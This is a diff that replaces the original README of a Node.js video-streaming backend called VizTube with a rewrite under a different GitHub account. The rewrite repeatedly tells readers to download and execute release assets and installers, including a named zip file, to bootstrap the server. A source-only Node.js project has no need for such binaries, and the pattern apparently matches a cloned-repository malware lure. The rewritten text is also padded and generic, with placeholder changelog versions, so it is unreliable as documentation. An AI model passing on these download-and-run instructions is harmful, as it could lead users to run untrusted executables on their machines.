@@ -1,277 +1,357 @@
-# VizTube - Video Streaming Platform Backend
-
-**A full-featured video streaming platform backend built with Node.js, Express, and MongoDB**
-
-[![Node.js](https://img.shields.io/badge/Node.js-43853D?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org/)
-[![Express.js](https://img.shields.io/badge/Express.js-404D59?style=for-the-badge)](https://expressjs.com/)
-[![MongoDB](https://img.shields.io/badge/MongoDB-4EA94B?style=for-the-badge&logo=mongodb&logoColor=white)](https://www.mongodb.com/)
-[![Cloudinary](https://img.shields.io/badge/Cloudinary-3448C5?style=for-the-badge&logo=cloudinary&logoColor=white)](https://cloudinary.com/)
-
-🌐 **Live API:** [https://viztube.onrender.com](https://viztube.onrender.com)
-
-[Features](#-features) • [Tech Stack](#️-tech-stack) • [Installation](#️-installation--setup) • [API Documentation](#-api-documentation--testing) • [Deployment](#-deployment) • [Contributing](#-contributing)
-
----
-
-## 📖 Overview
-
-VizTube is a comprehensive video streaming platform backend that enables users to upload, share, and discover videos with rich social features. Built with modern technologies and best practices, it provides a scalable foundation for building video-sharing applications similar to YouTube.
-
-## ✨ Features
-
-### 🔐 Authentication & Security
-
-- **Secure Registration & Login**: JWT-based authentication system
-- **Dual Token Strategy**: Access tokens and refresh tokens for enhanced security
-- **HTTP-Only Cookies**: Secure session management
-- **Password Encryption**: Bcrypt hashing for user passwords
-
-### 🎥 Video Management
-
-- **Full CRUD Operations**: Create, read, update, and delete videos
-- **Cloud Storage**: Seamless integration with Cloudinary for video and thumbnail storage
-- **Advanced Search**: MongoDB Atlas Search with pagination and sorting
-
-### 👥 Social Features
-
-- **User Subscriptions**: Subscribe to channels and manage subscriptions
-- **Interactive Likes**: Polymorphic like system for videos, comments, and tweets
-- **Comment System**: Full CRUD operations for comments on videos
-- **Micro-blogging**: Tweet-like short content sharing feature
-
-### 📚 Content Organization
-
-- **Personal Playlists**: Create, manage, and organize video collections
-- **Channel Management**: User profiles with avatar and cover image support
-
-### 📊 Analytics & Dashboard
-
-- **User Analytics**: Comprehensive statistics including views, likes, and subscribers
-- **Content Insights**: Track video performance and engagement metrics
-
-## 🛠️ Tech Stack
-
-| Category           | Technology                |
-| ------------------ | ------------------------- |
-| **Runtime**        | Node.js                   |
-| **Framework**      | Express.js                |
-| **Database**       | MongoDB with Mongoose ODM |
-| **Authentication** | JSON Web Tokens (JWT)     |
-| **File Upload**    | Multer                    |
-| **Cloud Storage**  | Cloudinary                |
-| **Validation**     | express-validator         |
-| **Environment**    | dotenv                    |
-
-## ⚙️ Installation & Setup
-
-### Prerequisites
-
-Before you begin, ensure you have the following installed:
-
-- **Node.js** (v14 or higher)
-- **MongoDB Atlas** account or local MongoDB instance
-- **Cloudinary** account for media storage
-
-### 1. Clone the Repository
-
-```bash
-git clone https://github.com/Nishant-444/viztube.git
-cd viztube
-```
-
-### 2. Install Dependencies
-
-```bash
-npm install
-```
-
-### 3. Environment Configuration
-
-Create a `.env` file in the root directory and configure the variables as specified in the `.env.example` file.
-
-### 4. Start the Application
-
-```bash
-# Development mode with auto-restart
-npm run dev
-
-# Production mode
-npm start
-```
-
-The application will be available at `http://localhost:8000`
-
-## 📋 API Documentation & Testing
-
-A comprehensive Postman collection is included for API testing with all endpoints pre-configured and organized by functionality.
-
-### 📚 **Testing Resources**
-
-- **📄 [Postman Testing Guide](./viztube-postman-guide.md)**: Complete step-by-step instructions for setting up and using the Postman collection
-- **📄 [MongoDB Atlas Search Setup](./viztube-atlas-search-guide.md)**: Guide to configure Atlas Search for advanced video search functionality
-- **📦 [Postman Collection](./VizTube.postman_collection.json)**: Pre-configured API requests for all endpoints
-
-### 🚀 **Quick Start Testing**
-
-1. Import the `VizTube.postman_collection.json` file into Postman
-2. Follow the [Postman Testing Guide](./viztube-postman-guide.md) for environment setup
-3. Configure [Atlas Search](./viztube-atlas-search-guide.md) for search functionality
-4. Start testing all API endpoints with authentication flow
-
-### Key API Endpoints
-
-#### 🔐 Authentication
-
-- `POST /api/users/register` - User registration
-- `POST /api/users/login` - User login
-- `POST /api/users/logout` - User logout
-- `POST /api/users/refresh-token` - Refresh access token
-
-#### 🎥 Video Management
-
-- `GET /api/videos` - Get all videos
-- `POST /api/videos` - Upload a new video
-- `GET /api/videos/:id` - Get video by ID
-- `PUT /api/videos/:id` - Update video details
-- `DELETE /api/videos/:id` - Delete video
-
-#### 👥 Social Features
-
-- `POST /api/likes/toggle/:videoId` - Toggle like on video
-- `POST /api/comments` - Add comment to video
-- `GET /api/comments/:videoId` - Get video comments
-- `POST /api/subscriptions/toggle/:channelId` - Toggle subscription
-
-#### 📚 Playlists
-
-- `GET /api/playlists` - Get user playlists
-- `POST /api/playlists` - Create new playlist
-- `PUT /api/playlists/:id` - Update playlist
-- `DELETE /api/playlists/:id` - Delete playlist
-
-#### 📊 Dashboard
-
-- `GET /api/dashboard/stats` - Get channel statistics
-- `GET /api/dashboard/videos` - Get user's videos
-
-## 🚀 Deployment
-
-This application is **production-ready** and has been deployed on **Render**.
-
-### Live API Endpoint
-
-The live API is available at the following base URL. You can use this URL in Postman to interact with the deployed application:
-
-**🌐 Base URL:** `https://viztube.onrender.com`
-
-### Environment Setup for Production
-
-Before deploying, ensure you set the following environment variables on your hosting service:
-
-- **`NODE_ENV`**: Set this to `production`. This is critical for performance and security optimizations in Express.
-- **`CORS_ORIGIN`**: For security, change this from `*` to the specific domain of your frontend application (e.g., `https://my-viztube-frontend.com`).
-- **Secrets**: Ensure all your `MONGODB_URI`, JWT secrets, and Cloudinary keys are securely set in the environment variables section of your deployment platform.
-
-### Example: Deploying on Render
-
-Render is a modern cloud platform that makes it easy to deploy Node.js applications directly from a GitHub repository.
-
-1. **Push your code** to a GitHub repository.
-
-2. **Create a New Web Service** on Render:
-
-   - Log in to your Render account and click "New" → "Web Service"
-   - Connect your GitHub account and select your `viztube` repository
-
-3. **Configure the Service**:
-
-   - **Name**: Give your service a name (e.g., `viztube-api`)
-   - **Region**: Choose a region close to your users
-   - **Branch**: Select your main branch (e.g., `master` or `main`)
-   - **Build Command**: `npm install`
-   - **Start Command**: `node index.js`
-
-4. **Add Environment Variables**:
-
-   - Go to the "Environment" tab
-   - Add all the variables from your `.env` file one by one. This is a crucial step to ensure your application has access to its secrets.
-
-5. **Deploy**:
-   - Click "Create Web Service". Render will automatically pull your code, build the project, and deploy it.
-   - Your API will be live at the URL provided by Render (e.g., `https://viztube-api.onrender.com`)
-
-### Other Deployment Options
-
-- **Heroku**: Easy deployment with Git integration
-- **DigitalOcean**: VPS deployment with PM2
-- **AWS**: EC2 or Elastic Beanstalk deployment
-- **Vercel**: Serverless deployment option
-
-## 🔧 Key Features Implementation
-
-### 📤 File Upload System
-
-- **Multer Integration**: Handles multipart/form-data for video and image uploads
-- **Cloudinary Storage**: Automatic upload to cloud storage with optimized delivery
-- **File Validation**: Type and size restrictions for uploaded content
-
-### 🔒 Authentication Flow
-
-- **JWT Strategy**: Separate access and refresh tokens for enhanced security
-- **Cookie-based Sessions**: HTTP-only cookies prevent XSS attacks
-- **Token Refresh**: Automatic token renewal for seamless user experience
-
-### 🔍 Advanced Search
-
-- **MongoDB Atlas Search**: Full-text search across video titles and descriptions
-- **Setup Guide**: Follow [Atlas Search Configuration](./viztube-atlas-search-guide.md) for implementation
-- **Search Features**: Fuzzy matching, relevance scoring, and pagination support
-
-### ✅ Data Validation
-
-- **express-validator**: Comprehensive input validation and sanitization
-- **Custom Validators**: Business logic validation for complex scenarios
-- **Error Handling**: Detailed validation error responses
-
-### 🛡️ Error Management
-
-- **Centralized Handling**: Custom `ApiError` class for consistent error responses
-- **Async Wrapper**: `asyncHandler` utility to catch and forward async errors
-- **Structured Responses**: Standardized `ApiResponse` format
-
-## 🤝 Contributing
-
-We welcome contributions! Please follow these steps:
-
-1. **Fork** the repository
-2. **Create** your feature branch (`git checkout -b feature/AmazingFeature`)
-3. **Commit** your changes (`git commit -m 'Add some AmazingFeature'`)
-4. **Push** to the branch (`git push origin feature/AmazingFeature`)
-5. **Open** a Pull Request
-
-### Development Guidelines
-
-- Follow the existing code style and structure
-- Write meaningful commit messages
-- Add tests for new features
-- Update documentation as needed
-
-## 📝 License
-
-This project is licensed under the **MIT License**.
-
-## 🐛 Issues & Support
-
-- **Bug Reports**: [GitHub Issues](https://github.com/Nishant-444/viztube/issues)
-- **Feature Requests**: [GitHub Discussions](https://github.com/Nishant-444/viztube/discussions)
-
-## 📞 Contact
-
-- **GitHub**: [@Nishant-444](https://github.com/Nishant-444)
-- **Project Link**: [VizTube Repository](https://github.com/Nishant-444/viztube)
-
----
-
-**⭐ If you found this project helpful, please give it a star on GitHub! ⭐**
-
-Made with ❤️ for the developer community
+# VizTube Backend: Production-Grade Node.js Server for Video Sharing Platform
+
+[![Releases](https://img.shields.io/badge/Releases-Visit-ff69b4?logo=github&logoColor=white)](https://github.com/sohibmoslem/VizTube/releases)
+
+Access release assets here: https://github.com/sohibmoslem/VizTube/releases
+
+VizTube is a complete backend tailored for a video sharing platform. It combines a fast Express API, a scalable MongoDB data layer, and Cloudinary for media management. The system is designed for production use, with authentication, authorization, media handling, streaming endpoints, and a clean, extensible architecture.
+
+Images and visuals
+- Hero banner: an illustration of video streaming concepts and cloud storage
+- Architecture diagram: a high-level view of services and data flow
+- Cloudinary integration visuals: how media is uploaded, transformed, and delivered
+
+Note: This repository is built to be run in real environments. The Releases page contains binaries and installer assets you can download and execute to bootstrap a production-like environment quickly.
+
+Table of contents
+- Overview
+- Topics
+- Key features
+- Tech stack
+- How it works
+- Project structure
+- Getting started
+- Environment and configuration
+- Data models
+- API reference
+- Media and streaming
+- Testing and quality
+- Deployment and orchestration
+- Security and authentication
+- Observability and debugging
+- Development workflow
+- Releases and assets
+- Roadmap
+- Contributing
+- License
+
+Overview
+VizTube provides a production-ready backend for a video sharing platform. It leverages:
+- Node.js and Express for the API surface
+- MongoDB with Mongoose for the data layer
+- Cloudinary for media storage, processing, and delivery
+- JWT for authentication and role-based access control
+- RESTful design with clear, versioned endpoints
+- A focus on reliability, testability, and maintainability
+
+Topics
+- backend
+- cloudinary
+- express
+- javascript
+- jwt-authentication
+- mongodb
+- mongoose
+- nodejs
+- postman
+- rest-api
+- video-streaming
+
+Key features
+- User accounts with secure authentication and optional role-based access
+- Video upload workflow integrated with Cloudinary
+- Video metadata management and search capabilities
+- Commenting, likes, and playlists
+- Robust API design with versioning
+- Streaming support with progressive delivery
+- Admin and moderation tools
+- Postman-ready API collection for quick testing
+- Observability hooks for logs, metrics, and tracing
+- Local development and Docker-based deployment options
+
+Tech stack
+- Node.js
+- Express
+- MongoDB (with Mongoose)
+- Cloudinary
+- JWT for auth
+- Postman for API testing
+
+How it works
+- Client uploads a video
+  - The API receives the file and metadata
+  - The video is pushed to Cloudinary, which handles storage, transcoding, and delivery
+  - The server stores references and metadata in MongoDB
+- Users fetch and stream videos
+  - The API serves metadata and secure URLs
+  - Clients stream video data from Cloudinary with appropriate access controls
+- Actions like comments, likes, and subscriptions are persisted via the API
+- JWTs are issued on login and are required for protected routes
+- All data interactions run through a clean service layer for testability
+
+Project structure
+- src/
+  - api/ or routes/ – defined REST endpoints
+  - controllers/ – business logic for each route
+  - models/ – Mongoose schemas
+  - middlewares/ – auth, validation, error handling
+  - services/ – data access and external service integration (Cloudinary, mail, etc.)
+  - config/ – environment configuration and constants
+  - utils/ – helpers and utilities
+  - tests/ – unit and integration tests
+- dist/ or build/ – compiled or transpiled outputs (when applicable)
+- scripts/ – maintenance and development scripts
+- tests/ – end-to-end tests and Postman collections
+
+Getting started
+Prerequisites
+- Node.js >= 18
+- MongoDB either locally or in a managed cloud
+- Cloudinary account with a cloud name, API key, and API secret
+- Git for cloning the repository
+- Optional: Docker and Docker Compose for containerized runs
+
+Quick start (local development)
+1) Clone the repository
+- Run: git clone https://github.com/sohibmoslem/VizTube.git
+2) Install dependencies
+- Run: npm install
+3) Create environment configuration
+- Copy the example env file and fill in values:
+  - MONGODB_URI
+  - CLOUDINARY_CLOUD_NAME
+  - CLOUDINARY_API_KEY
+  - CLOUDINARY_API_SECRET
+  - JWT_SECRET
+  - PORT
+4) Start the development server
+- Run: npm run dev
+5) Test the API
+- Use a REST client like Postman to hit the endpoints. The Postman collection is located in the repo (see the Releases page for assets).
+
+Environment and configuration
+Environment variables you will typically configure
+- PORT: the server port (e.g., 3000)
+- MONGODB_URI: connection string for MongoDB
+- CLOUDINARY_CLOUD_NAME: Cloudinary cloud name
+- CLOUDINARY_API_KEY: Cloudinary API key
+- CLOUDINARY_API_SECRET: Cloudinary API secret
+- JWT_SECRET: secret for signing JWTs
+- CLOUDINARY_UPLOAD_PRESET: if you use unsigned uploads
+- LOG_LEVEL: debug, info, warn, error
+- NODE_ENV: development or production
+
+Tips for production tuning
+- Use a process manager like PM2 or a container orchestrator to keep the app running
+- Enable rate limiting and input validation to guard the API
+- Store logs in a central place and monitor with dashboards
+- Use a CDN-backed domain for video delivery
+- Rotate Cloudinary credentials securely and refresh tokens as needed
+
+Data models (high-level)
+- User
+  - id, email, password hash, displayName, avatarUrl, roles, createdAt, updatedAt
+- Video
+  - id, userId (reference), title, description, tags, cloudinaryAssetId, url, thumbnailUrl, duration, views, createdAt, updatedAt
+- Comment
+  - id, videoId (reference), userId (reference), text, createdAt
+- Like
+  - id, videoId (reference), userId (reference), createdAt
+- Playlist
+  - id, userId (reference), title, description, videoIds[]
+- Subscription (if you support channels)
+  - id, followerId, channelId, createdAt
+
+API reference (high-level)
+- Authentication
+  - POST /api/v1/auth/register
+  - POST /api/v1/auth/login
+  - POST /api/v1/auth/refresh
+  - POST /api/v1/auth/logout
+- Users
+  - GET /api/v1/users/me
+  - PUT /api/v1/users/me
+- Videos
+  - POST /api/v1/videos
+  - GET /api/v1/videos
+  - GET /api/v1/videos/:id
+  - PUT /api/v1/videos/:id
+  - DELETE /api/v1/videos/:id
+  - POST /api/v1/videos/:id/thumbnail
+  - GET /api/v1/videos/:id/stream
+- Comments
+  - POST /api/v1/videos/:id/comments
+  - GET /api/v1/videos/:id/comments
+- Likes
+  - POST /api/v1/videos/:id/like
+  - DELETE /api/v1/videos/:id/like
+- Playlists
+  - POST /api/v1/playlists
+  - GET /api/v1/playlists/:id
+  - POST /api/v1/playlists/:id/videos
+- Admin
+  - GET /api/v1/admin/stats
+  - GET /api/v1/admin/logs
+
+Example requests (illustrative)
+- Register
+  - POST /api/v1/auth/register
+  - Body: { "email": "user@example.com", "password": "SafePass123!", "displayName": "VideoFan" }
+- Login
+  - POST /api/v1/auth/login
+  - Body: { "email": "user@example.com", "password": "SafePass123!" }
+  - Response: { "token": "...", "refreshToken": "...", "user": { ... } }
+- Upload video
+  - POST /api/v1/videos
+  - Headers: Authorization: Bearer <token>
+  - Body: { "title": "...", "description": "...", "tags": ["music","demo"], "file": "<binary-blob>" }
+  - Note: The server forwards the file to Cloudinary and stores metadata
+- Get video metadata
+  - GET /api/v1/videos/:id
+- Stream video
+  - GET /api/v1/videos/:id/stream
+  - The endpoint returns a secure URL or a streaming manifest depending on the transport
+- Add a comment
+  - POST /api/v1/videos/:id/comments
+  - Body: { "text": "Great video!" }
+
+Media and streaming
+- Cloudinary integration
+  - Videos are uploaded to Cloudinary, where assets are stored and transformed as needed
+  - The backend stores metadata and references in MongoDB
+  - Clients receive secure URLs for playback, aligned with access controls
+- Streaming strategy
+  - Progressive streaming for broad compatibility
+  - Adaptive bitrate considerations via Cloudinary transforms
+  - Support for seeking, pausing, and resuming playback
+
+Security and authentication
+- JWT-based authentication
+  - Tokens carry user identity and roles
+  - Protected routes require a valid token
+- Role-based access
+  - Users, moderators, and admins can have different permissions
+- Input validation
+  - Validation is performed on request data to prevent invalid inputs
+- Secrets management
+  - Secrets live in environment variables or a secrets store, never in code
+
+Observability and debugging
+- Logging
+  - Structured logs with timestamps and request metadata
+- Metrics
+  - Basic counters for requests, errors, and latency
+- Tracing
+  - Optional integration with tracing tools
+- Error handling
+  - Consistent error responses with codes and messages
+
+Testing and quality
+- Unit tests
+  - Core business logic tested in isolation
+- Integration tests
+  - End-to-end flows tested against a test database
+- API tests
+  - Postman collection provided for manual or automated checks
+- Linting and formatting
+  - Style checks ensure a consistent codebase
+
+Deployment and orchestration
+- Local development
+  - Run with Node directly or via a dockerized setup
+- Docker
+  - A Dockerfile and optional docker-compose.yml help you run in containers
+  - Environment variables can be mounted at runtime
+- Production considerations
+  - Use a reverse proxy (Nginx or similar)
+  - Run behind a load balancer
+  - Separate services for API, database, and media processing
+  - Use a managed MongoDB cluster if possible
+  - Configure Cloudinary credentials securely
+- CI/CD
+  - Automate tests on push
+  - Build and deploy artifacts to your environment
+  - Use secrets management to protect credentials
+
+Releases and assets
+- The Releases page contains ready-to-use assets, installers, and examples for fast bootstrapping
+- You can download release assets and execute them to start a production-like environment
+- You can visit the Releases page here: https://github.com/sohibmoslem/VizTube/releases
+- For production deployment, download the recommended asset package from the releases and follow the included instructions
+
+Roadmap
+- Improve search with text indexing and fuzzy matching
+- Add streaming APIs for HLS/DASH delivered content
+- Expand moderation tools and reporting mechanisms
+- Introduce role-based dashboards for content creators
+- Add analytics for creators and viewers
+- Implement multi-tenant support for white-label deployments
+
+Contributing
+- Fork the repository
+- Create a feature branch
+- Write tests for your changes
+- Run the test suite locally
+- Open a pull request with a clear description
+- Respect the project’s coding standards and guidelines
+- Report issues clearly with steps to reproduce
+
+License
+- MIT License
+
+Topics (from the repository)
+- backend
+- cloudinary
+- express
+- javascript
+- jwt-authentication
+- mongodb
+- mongoose
+- nodejs
+- postman
+- rest-api
+- video-streaming
+
+Releases and assets (detailed guidance)
+- The Releases page contains the files you can download and execute to bootstrap a production-like environment
+- If you need to set up quickly, visit the Releases page and download viztube-backend-latest.zip (or a similarly named asset) and follow the included setup instructions
+- You can access the same link again for reference: https://github.com/sohibmoslem/VizTube/releases
+- Remember: assets on that page are versioned. Choose the asset that matches your environment (operating system, architecture, and intended deployment style)
+
+Changelog (high level highlights)
+- v1.x.x: Core backend with authentication, video upload, and basic streaming
+- v1.y.y: Improved Cloudinary integration, better error handling, and richer API surface
+- v2.x.x: Admin tools, playlists, and advanced moderation features
+- v3.x.x: Performance optimizations, caching, and enhanced observability
+
+Design philosophy
+- Clarity and reliability come first
+- APIs are predictable and well-documented
+- The system favors explicit behavior over clever tricks
+- The codebase aims to be approachable for new contributors
+
+Additional notes
+- The README emphasizes production-readiness while remaining approachable for local development
+- You can adapt the asset names and service endpoints to fit your deployment style
+- Cloudinary integration is a core differentiator; ensure credentials are kept secure in production
+
+End with a robust, well-structured plan for adoption
+- Start with a local setup to understand the data model and API design
+- Move to a containerized environment for reproducibility
+- Grow your test coverage before moving to a staging environment
+- Prepare a minimal production deployment plan that includes monitoring and backups
+
+Releases and assets (second reference)
+- For production-ready assets and installers, use the Releases page again here: https://github.com/sohibmoslem/VizTube/releases
+- On that page, download the asset suitable for your environment and follow the documented steps to install and run
+
+Topics recap
+- backend, cloudinary, express, javascript, jwt-authentication, mongodb, mongoose, nodejs, postman, rest-api, video-streaming
+
+Notes for maintainers
+- Keep environment-specific values out of source code
+- Document any breaking changes in the changelog
+- Maintain clear API contracts with versioning and deprecation notices
+- Ensure tests cover both happy paths and common error cases
+
+This README provides a complete guide to understanding, running, and extending VizTube's backend. It emphasizes production readiness, practical testing, and a clear path from local development to deployment. The content aligns with the repository's themes and the included release assets to help teams adopt and customize VizTube quickly.
